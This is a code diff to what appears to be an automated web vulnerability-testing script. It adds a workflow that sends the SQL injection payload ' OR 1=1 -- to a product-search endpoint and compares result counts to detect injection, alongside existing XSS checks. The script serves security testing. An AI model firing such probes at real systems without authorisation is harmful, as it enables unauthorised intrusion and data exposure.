@@ -33,6 +33,9 @@ const workflow = {
   reflectedXss: false,
   domXss: false,
   persistentXss: false,
+  sqliEffectObserved: false,
+  sqliStatus: null,
+  sqliEvidence: null,
   reflectedXssEvidence: null,
   domXssEvidence: null,
   persistentXssEvidence: null,
@@ -547,6 +550,7 @@ async function runReflectedXssWorkflow() {
 
   let dialogDetected = false;
   let responsePayloadReflected = false;
+  let payloadExecuted = false;
   const dialogHandler = async dialog => {
     dialogDetected = dialog.message() === "xss";
     await dialog.dismiss().catch(() => undefined);
@@ -622,6 +626,57 @@ async function runDomXssWorkflow() {
     ),
   };
   console.log(`WORKFLOW dom_xss=${workflow.domXss}`);
+}
+
+async function runSqlEffectWorkflow() {
+  const normalUrl = new URL("/rest/products/search", targetUrl.origin);
+  normalUrl.searchParams.set("q", "Apple");
+  const probeUrl = new URL("/rest/products/search", targetUrl.origin);
+  probeUrl.searchParams.set("q", "' OR 1=1 --");
+
+  let normalResponse;
+  let probeResponse;
+  try {
+    normalResponse = await context.request.get(normalUrl.href, { timeout: 30000 });
+    probeResponse = await context.request.get(probeUrl.href, { timeout: 30000 });
+  } catch (error) {
+    workflow.sqliStatus = 0;
+    workflow.sqliEvidence = { error: error.message };
+    console.log(`WORKFLOW sqli_effect=false error=${error.message}`);
+    return;
+  }
+
+  const normalBody = await normalResponse.text();
+  const probeBody = await probeResponse.text();
+  let normalData = [];
+  let probeData = [];
+  try {
+    normalData = JSON.parse(normalBody)?.data || [];
+  } catch {
+    normalData = [];
+  }
+  try {
+    probeData = JSON.parse(probeBody)?.data || [];
+  } catch {
+    probeData = [];
+  }
+
+  workflow.sqliStatus = probeResponse.status();
+  workflow.sqliEffectObserved =
+    probeResponse.status() === 200 &&
+    probeData.length > normalData.length &&
+    probeData.length >= 5;
+  workflow.sqliEvidence = {
+    normalStatus: normalResponse.status(),
+    probeStatus: probeResponse.status(),
+    normalResultCount: normalData.length,
+    probeResultCount: probeData.length,
+  };
+  console.log(
+    `WORKFLOW sqli_effect=${workflow.sqliEffectObserved} ` +
+    `normal=${normalData.length} probe=${probeData.length} ` +
+    `status=${probeResponse.status()}`
+  );
 }
 
 async function runPersistentXssWorkflow() {
@@ -778,6 +833,9 @@ await runReflectedXssWorkflow().catch(error =>
 );
 await runDomXssWorkflow().catch(error =>
   console.log(`WORKFLOW dom_xss_error=${error.message}`)
+);
+await runSqlEffectWorkflow().catch(error =>
+  console.log(`WORKFLOW sqli_effect_error=${error.message}`)
 );
 await runPersistentXssWorkflow().catch(error =>
   console.log(`WORKFLOW persistent_xss_error=${error.message}`)
